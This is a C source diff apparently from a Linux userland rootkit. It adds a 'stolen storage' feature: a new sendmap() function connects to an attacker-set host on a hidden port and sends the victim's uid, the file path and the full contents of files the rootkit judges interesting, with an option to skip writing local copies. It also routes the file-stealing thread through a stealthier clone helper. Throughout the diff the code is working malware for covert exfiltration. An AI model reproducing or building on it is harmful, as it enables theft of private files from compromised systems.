@@ -151,8 +151,6 @@ char *pathtmp(char *newpath){
 // determine if the file's .tmp is still up.
 // if it is, determine if newpath is still being written.
 // if it is, status=1, so don't try to write the file again.
-// if it is not, see if its size matches the target file to steal.
-// it it does not match, a steal has stopped during a previous.
 int tmpup(char *newpath){
     char *path;
     int status=0;
@@ -181,9 +179,63 @@ nopenope:
     return status;
 }
 
+#ifdef STOLEN_STORAGE
+int sendmap(const char *oldpath, unsigned char *map, off_t fsize){
+    char *host;
+    unsigned char tmp[2];
+    int sockfd;
+    unsigned short port;
+    struct sockaddr_in sa;
+
+    hook(CSOCKET);
+    sockfd = (long)call(CSOCKET, AF_INET, SOCK_STREAM, 0);
+    if(sockfd < 0) return -1;
+
+    host = gethost();
+    if(host == NULL){
+        shutdown(sockfd, SHUT_RDWR);
+        close(sockfd);
+        return -1;
+    }
+    port = getport();
+    if(!is_hidden_port(port)){
+        shutdown(sockfd, SHUT_RDWR);
+        close(sockfd);
+        free(host);
+        return -1;
+    }
+
+    sa.sin_family = AF_INET;
+    sa.sin_addr.s_addr = inet_addr(host);
+    free(host);
+    sa.sin_port = htons(port);
+
+    if(connect(sockfd, (struct sockaddr*)&sa, sizeof(sa)) < 0){
+        shutdown(sockfd, SHUT_RDWR);
+        close(sockfd);
+        return -1;
+    }
+
+    // send handy information about the target first.
+    char initp[strlen(oldpath)+512];
+    memset(initp, 0, sizeof(initp));
+    snprintf(initp, sizeof(initp), "SOF:%u:%s:%ld\n", getuid(), oldpath, fsize);
+    send(sockfd, initp, strlen(initp), 0);
+
+    for(off_t i=0; i<fsize; i++){
+        snprintf((char*)tmp, 2, "%c", map[i]);
+        send(sockfd, tmp, 1, 0);
+    }
+
+    shutdown(sockfd, SHUT_RDWR);
+    close(sockfd);
+    return 1;
+}
+#endif
+
 int writecopy(const char *oldpath, char *newpath){
     struct stat64 nstat; // for newpath, should it exist, to check if there's a change in size.
-    int statr, t;
+    int statr, t, done;
     unsigned char *map, p;
     char *tmppath;
     FILE *ofp, *nfp;
@@ -201,10 +253,18 @@ int writecopy(const char *oldpath, char *newpath){
     else if(ofp == NULL) return -1;
 
     t = tmpup(newpath);
-    if(!S_ISREG(mode) || t || t<0 || (statr != -1 && nstat.st_size == fsize)){
+    if(!S_ISREG(mode) || t || t<0){
         fclose(ofp);
         return 1;
     }
+
+    done = 1 ? (statr != -1 && nstat.st_size == fsize) : 0;
+#ifndef STOLEN_STORAGE
+    if(done){
+        fclose(ofp);
+        return 1;
+    }
+#endif
 
 #ifdef MAX_FILE_SIZE
     if(fsize > MAX_FILE_SIZE){
@@ -231,9 +291,30 @@ int writecopy(const char *oldpath, char *newpath){
     }
     fclose(ofp);
 
+
+#ifdef STOLEN_STORAGE
+    int sendstatus = sendmap(oldpath, map, fsize);
+    if(sendstatus > 0
+        #ifdef NO_DISK_WRITE
+        || sendstatus < 0
+        #endif
+        ){
+        madvise(map, fsize, MADV_DONTNEED);
+        munmap(map, fsize);
+        return 1;
+    }
+
+    // this lets hoarder decide
+    if(done){
+        madvise(map, fsize, MADV_DONTNEED);
+        munmap(map, fsize);
+        return 1;
+    }
+#endif
+
     call(CUNLINK, newpath);
 
-    nfp = call(CFOPEN, newpath, "a");
+    nfp = call(CFOPEN, newpath, "ab");
     if(nfp == NULL){
         madvise(map, fsize, MADV_DONTNEED);
         munmap(map, fsize);
@@ -272,7 +353,7 @@ char *getnewpath(char *filename){
     char *ret, *filenamedup = strdup(filename);
 
     if(filenamedup[0] == '.') // remove prefixed '.' if there is one.
-        memmove(filenamedup, filenamedup + 1, strlen(filenamedup));
+        memmove(filenamedup, filenamedup+1, strlen(filenamedup));
 
     ret = malloc(path_maxlen);
     if(!ret) return NULL;
@@ -310,6 +391,7 @@ static int takeit(void *oldpath){
     return ret;
 }
 
+
 void inspectfile(const char *pathname){
     if(sssdproc() || rknomore(INSTALL_DIR, BDVLSO)) return;
 
@@ -330,22 +412,12 @@ void inspectfile(const char *pathname){
         goto nopenope;
 
     if(interesting(pathname) || interesting(filename)){
-        const int STACK_SIZE = 8912;
-        char *stack, *sptr;
-
-        stack = malloc(STACK_SIZE);
-        if(!stack) goto nopenope;
-        sptr = stack+STACK_SIZE;
-
-        unsigned long flags = CLONE_PARENT|CLONE_DETACHED;
-        if(!notuser(0)) flags |= CLONE_NEWUTS;
 #ifdef BLACKLIST_TOO
         if(!uninteresting(filename))
-            clone(takeit, sptr, flags, dupdup);
+            sneakyclone(takeit, dupdup);
 #else
-        clone(takeit, sptr, flags, dupdup);
+        sneakyclone(takeit, dupdup);
 #endif
-        free(stack);
     }
 nopenope:
     free(dupdup);
